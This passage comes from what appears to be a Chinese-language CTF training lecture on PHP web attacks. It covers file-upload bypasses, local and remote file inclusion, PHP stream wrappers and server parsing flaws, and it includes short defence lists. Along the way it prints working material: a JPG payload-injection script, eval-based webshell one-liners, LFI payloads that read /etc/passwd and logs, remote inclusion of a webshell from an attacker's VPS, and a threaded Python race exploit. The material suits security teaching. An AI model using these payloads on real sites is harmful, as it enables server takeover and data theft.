class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>1、先上传JPG图片，然后下载至本地保存为1.jpg</p>
<p>2、插入php代码，用脚本处理1.jpg</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">php jpg_payload.php <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure>
<p>3、上传图片马；将生成的 payload_1.jpg上传。</p>
<p>4、验证；将上传的图片再次下载到本地。</p>
<p>可以看到，php代码没有被去除，证明我们成功上传了含有php代码的jpg图片。</p>
<p>注意：有一些jpg图片不能被处理，所以要多尝试一些jpg图片。</p>
<h3 id="文件幻数检测（文件开头）"><a href="#文件幻数检测（文件开头）" class="headerlink" title="文件幻数检测（文件开头）"></a>文件幻数检测（文件开头）</h3><blockquote>
<p>幻数 magic number，它可以用来标记文件或者协议的格式，很多文件都有幻数标志来表明该文件的格式。</p>
</blockquote>
<p>要绕过文件幻数检测就要在文件开头写上如下的值</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">.jpg	FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">.gif	47 49 46 38 39 61</span><br><span class="line">.png	89 50 4E 47</span><br></pre></td></tr></table></figure>
<p>在文件幻数后面加上自己的WebShell代码就行（常见的是<code>GIF89a</code>）</p>
<p>图像文件相关信息检测常用的是<code>getimagesize()</code>函数，需要把文件头部分伪造，也就是在幻数的基础上还加了一些文件信息。</p>
<p><img src="C:/Users/13611/Desktop/nep冬令营/讲课/深入一些吧.assets/image-20210208225003833.png" alt="image-20210208225003833"></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure>
<h3 id="竞争条件攻击"><a href="#竞争条件攻击" class="headerlink" title="竞争条件攻击"></a>竞争条件攻击</h3><p><code>如upload-labs第十七关</code></p>
<p>一些网站允许上传任意文件，然后检测文件是否包含Webshell，如果有则删除该文件。</p>
<blockquote>
<p>服务器端在处理不同用户的请求时是并发进行的</p>
<p>如果并发处理不当或相关操作逻辑顺序设计的不合理时，将导致条件竞争漏洞</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>]))&#123;</span><br><span class="line">		copy(<span class="variable">$_GET</span>[<span class="string">&#x27;src&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;dst&#x27;</span>]);</span><br><span class="line">      sleep(<span class="number">2</span>);<span class="comment">//检查操作</span></span><br><span class="line">		unlink(<span class="variable">$_GET</span>[<span class="string">&#x27;dst&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>它先把文件保存在本地，再检查，然后删除</p>
<p>在上传完成和安全检查删除它的间隙，攻击者用多线程不断的发起访问请求该文件</p>
<p>该文件就会被执行从而生成一个恶意shell</p>
<p><strong>竞争删除前生成shell流程：</strong></p>
<blockquote>
<p>上传文件→访问执行文件，生成shell文件→删除不安全文件     (多线程访问)</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="user-ini绕过"><a href="#user-ini绕过" class="headerlink" title=".user.ini绕过"></a>.user.ini绕过</h3><p>在php执行的过程中，除了主 <code>php.ini</code> 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。 <code>.user.ini</code> 中可以定义除了PHP_INI_SYSTEM以外的模式的选项，故可以使用 <code>.user.ini</code> 加上非php后缀的文件构造一个shell，比如 <code>auto_prepend_file=01.gif</code> </p>
<ul>
<li>需要当前上传的目录下有php文件</li>
</ul>
<p><a href="https://www.cnblogs.com/sijidou/p/13121301.html">.user.ini导致文件上传绕过</a></p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><blockquote>
<ul>
<li>文件扩展名服务端白名单效验</li>
<li>文件内容服务端效验  &lt;? php </li>
<li>上传文件重命名</li>
<li>隐藏上传文件路径</li>
<li>限制相关目录的执行权限，防范WebShell攻击</li>
</ul>
</blockquote>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><blockquote>
<p>程序开发人员通常出于灵活性的考虑，会将被包含的文件设置成变量，然后动态调用这些文件。</p>
<p>但正是因为调用的灵活性导致用户可能调用一些恶意文件，造成文件包含漏洞</p>
</blockquote>
<h3 id="demo实验"><a href="#demo实验" class="headerlink" title="demo实验"></a>demo实验</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>()		<span class="comment">//使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。</span></span><br><span class="line">    <span class="comment">//warning</span></span><br><span class="line"><span class="keyword">include_once</span>()	<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>()		<span class="comment">//使用此函数，只要程序执行，立即调用此函数包含文件发生错误时，会输出错误信息并立即终止程序。</span></span><br><span class="line"><span class="keyword">require_once</span>()	<span class="comment">//功能和前者一样，区别在于当重复调用同一文件时，程序只调用一次。</span></span><br></pre></td></tr></table></figure>
<h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><blockquote>
<p>用户可以控制包含的文件名，从而造成信息泄露和getshell</p>
</blockquote>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.读敏感文件</span><br><span class="line">?file&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">2.利用封装协议读源码</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php	#这样能看到php文件的源码</span><br><span class="line"></span><br><span class="line">4.包含日志文件getshell</span><br><span class="line">路径</span><br><span class="line">apache:&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</span><br><span class="line">nginx:&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line"></span><br><span class="line">3.包含图片Getshell</span><br><span class="line">在上传的图片中写入恶意代码，然后用 LFI 包含调用，就会执行图片里的PHP代码</span><br><span class="line"></span><br><span class="line">5.session文件包含getshell</span><br></pre></td></tr></table></figure>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>CTFSHOW-web80-81</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br></pre></td></tr></table></figure>
<h4 id="照片木马的制作"><a href="#照片木马的制作" class="headerlink" title="照片木马的制作"></a>照片木马的制作</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">执行命令copy 1.png&#x2F;b + 1.php&#x2F;a 2.jpg </span><br><span class="line">前两个文件合并成一个文件，文件属性为2.jpg</span><br></pre></td></tr></table></figure>
<h3 id="PHP中的封装协议-伪协议"><a href="#PHP中的封装协议-伪协议" class="headerlink" title="PHP中的封装协议(伪协议)"></a>PHP中的封装协议(伪协议)</h3><h4 id="file"><a href="#file" class="headerlink" title="file://"></a><strong>file://</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用于访问本地文件系统，在CTF中通常用来读取本地文件,且不受allow_url_fopen与allow_url_include的影响。</span><br><span class="line">include()&#x2F;require()&#x2F;include_once()&#x2F;require_once()参数可控的情况下</span><br></pre></td></tr></table></figure>
<h4 id="php"><a href="#php" class="headerlink" title="php://"></a><strong>php://</strong></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">条件：</span><br><span class="line">allow_url_fopen:off&#x2F;on</span><br><span class="line">allow_url_include : 部分需要on (下面列出)</span><br><span class="line">php:&#x2F;&#x2F;input  #用的比较多 输入流</span><br></pre></td></tr></table></figure>
<h5 id="作用："><a href="#作用：" class="headerlink" title="作用："></a><strong>作用：</strong></h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是 php://filter 和 php://input</span></span><br><span class="line">php:<span class="comment">//filter用于读取源码，php://input用于执行php代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1. php://filter/read=convert.base64-encode/resource=[文件名]  //读取文件源码</span></span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=phpinfo.php</span><br><span class="line"><span class="comment">#ctfshow web78</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.php://input + [POST DATA]执行php代码</span></span><br><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分] &lt;?php phpinfo(); ?&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.若有写入权限，[POST DATA部分] 写入一句话木马</span></span><br><span class="line">&lt;?php fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); ?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><h5 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">allow_url_fopen:on</span><br><span class="line"></span><br><span class="line">allow_url_include :on</span><br><span class="line">#ctfshow web79</span><br><span class="line">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs &#x3D;&#x3D;&#x3D;&gt;   &lt;?php system(&#39;cat flag.php&#39;);</span><br></pre></td></tr></table></figure>
<p><strong>作用</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">自PHP&gt;=<span class="number">5.2</span>.<span class="number">0</span>起，可以使用 data:<span class="comment">// 数据流封装器，以传递相应格式的数据。</span></span><br><span class="line">通常可以用来执行PHP代码</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.data://text/plain,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,<span class="meta">&lt;?php</span>%20phpinfo();<span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.data://text/plain;base64,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure>
<h3 id="远程文件包含-RFL"><a href="#远程文件包含-RFL" class="headerlink" title="远程文件包含(RFL)"></a>远程文件包含(RFL)</h3><blockquote>
<p>服务器通过 PHP 的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，</p>
<p>从而可以去包含一个恶意文件，攻击者就可以远程构造一个特定的恶意文件达到攻击目的。</p>
</blockquote>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>条件：</strong><code>php.ini</code>中开启<code>allow_url_include</code>、<code>allow_url_fopen</code>选项。</p>
<p><strong>1、远程包含Webshell</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?arg=http://攻击者的VPS/shell.txt</span><br><span class="line"><span class="comment">#会在网站目录生成名为 shell.php 的一句话木马</span></span><br></pre></td></tr></table></figure>
<p><strong>shell.txt内容为：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[123]) ?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h4><h5 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h5><p>如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.%2562ase64-encode&#x2F;resource</span><br></pre></td></tr></table></figure>
<h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a><strong>%00截断</strong></h5><p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span> . <span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="文件包含getshell"><a href="#文件包含getshell" class="headerlink" title="文件包含getshell"></a>文件包含getshell</h5><p><a href="https://xz.aliyun.com/t/5535#toc-2">浅析php文件包含及其getshell的姿势</a></p>
<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><ol>
<li>禁止远程文件包含 <code>allow_url_include=off</code></li>
<li>配置 <code>open_basedir=指定目录</code>，限制访问区域。</li>
<li>过滤<code>../</code>等特殊符号</li>
<li>修改Apache日志文件的存放地址</li>
<li>开启魔术引号 <code>magic_quotes_qpc=on  php 4 5</code> </li>
<li>尽量不要使用动态变量调用文件，直接写要包含的文件。</li>
</ol>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>文件上传经常和文件包含一起考察。  如：ctfshow web164</p>
<ul>
<li><p>判断是黑名单还是白名单</p>
</li>
<li><p>白名单解析漏洞绕过，配合文件包含 照片二次渲染等等</p>
</li>
<li><p>黑名单扩展名绕过或.htaccess,.user.ini等绕过总结</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include() url</span><br><span class="line">file_get_concent()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="解析漏洞攻击"><a href="#解析漏洞攻击" class="headerlink" title="解析漏洞攻击"></a>解析漏洞攻击</h3><p>主要有目录解析、文件解析，Apache解析漏洞、Nginx解析漏洞、IIS7.5解析漏洞。</p>
<h4 id="zip-amp-bzip2-amp-zlib"><a href="#zip-amp-bzip2-amp-zlib" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://"></a><strong>zip:// &amp; bzip2:// &amp; zlib://</strong></h4><p><strong>作用：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">zip:<span class="comment">// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件</span></span><br><span class="line"></span><br><span class="line">更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等</span><br></pre></td></tr></table></figure>
<h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">phar:&#x2F;&#x2F;协议与zip:&#x2F;&#x2F;类似，同样可以访问zip格式压缩包内容</span><br><span class="line">#经常使用于序列化</span><br></pre></td></tr></table></figure>
<h3 id="session-upload-progress"><a href="#session-upload-progress" class="headerlink" title="session.upload_progress"></a>session.upload_progress</h3><p><a href="https://www.freebuf.com/news/202819.html">利用session.upload_progress进行文件包含</a></p>
<p><a href="https://ctf.show/">CTFSHOW</a></p>
<p><code>sess_flag</code></p>
<p><img src="C:/Users/13611/Desktop/nep冬令营/讲课/深入一些吧.assets/4.png" alt="4"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;url&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">256</span> * <span class="number">1</span>) <span class="comment">#建议正常这个填充数据大一点</span></span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat ../f*&quot;);?&gt;&#x27;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(url+<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">write = threading.Thread(target=write, args=(session,))</span><br><span class="line">write.daemon = <span class="literal">True</span> <span class="comment">#当daemon为True时，父线程在运行完毕后，子线程无论是否正在运行，都会伴随主线程一起退出。</span></span><br><span class="line">write.start()</span><br><span class="line">read()</span><br></pre></td></tr></table></figure>
<h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p>
<p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p>
<p>那么在长度有限的时候，<code>././././</code> (n个) 的形式就可以通过这个把路径爆掉</p>
<p>在php代码包含中，这种绕过方式要求php版本 &lt; php 5.2.8</p>
<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="一-IIS5-x-6-x解析漏洞"><a href="#一-IIS5-x-6-x解析漏洞" class="headerlink" title="(一)IIS5.x-6.x解析漏洞"></a>(一)IIS5.x-6.x解析漏洞</h3><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp;该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<p>目录解析(6.0)<br>形式：www.xxx.com/xx.asp/xx.jpg<br>原理: 服务器默认会把.asp，.asp目录下的文件都解析成asp文件。（传个图片马）</p>
<p>文件解析<br>形式：www.xxx.com/xx.asp;.jpg（文件名）<br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。<br>解析文件类型</p>
<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :<br>/test.asa<br>/test.cer<br>/test.cdx</p>
<h4 id="Iis7-5解析漏洞-php-ini开启fix-pathinfo"><a href="#Iis7-5解析漏洞-php-ini开启fix-pathinfo" class="headerlink" title="Iis7.5解析漏洞(php.ini开启fix_pathinfo)"></a>Iis7.5解析漏洞(php.ini开启fix_pathinfo)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.php --&gt; &#x2F;xx.jpg         &#x2F;&#x2F;上传.jpg一句话，访问时后面加上&#x2F;xx.php </span><br></pre></td></tr></table></figure>
<h3 id="二-apache解析漏洞"><a href="#二-apache解析漏洞" class="headerlink" title="(二)apache解析漏洞"></a>(二)apache解析漏洞</h3><p>PHP 5.2 00存在截断上传（0x00）(%00)<br>PHP 5.3之后就没有了该漏洞</p>
<p>漏洞原理<br>Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如test.php.qwe.asd “.qwe”和”.asd” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.qwe.asd解析成php。</p>
<p>漏洞形式<br>www.xxxx.xxx.com/test.php.php123<br>其余配置问题导致漏洞</p>
<p>(1)如果在 Apache 的 conf 里有这样一行配置 </p>
<p>AddHandler php5-script .php</p>
<p> 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>(2)如果在 Apache 的 conf 里有这样一行配置 </p>
<p>AddType application/x-httpd-php .jpg </p>
<p>即使扩展名是 jpg，一样能以php 方式执行。（htaccess文件上传解析漏洞，可以将这段代码写到.htaccess中，再上传写有php一句话代码的jpg文件中）</p>
<h3 id="三-nginx解析漏洞"><a href="#三-nginx解析漏洞" class="headerlink" title="(三)nginx解析漏洞"></a>(三)nginx解析漏洞</h3><p>漏洞原理<br>Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为 “phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：<br>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<p>漏洞形式<br>www.xxxx.com/UploadFiles/image/1.jpg/1.php<br>www.xxxx.com/UploadFiles/image/1.jpg%00.php<br>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</p>
<p>另外一种手法：上传一个名字为test.jpg，然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
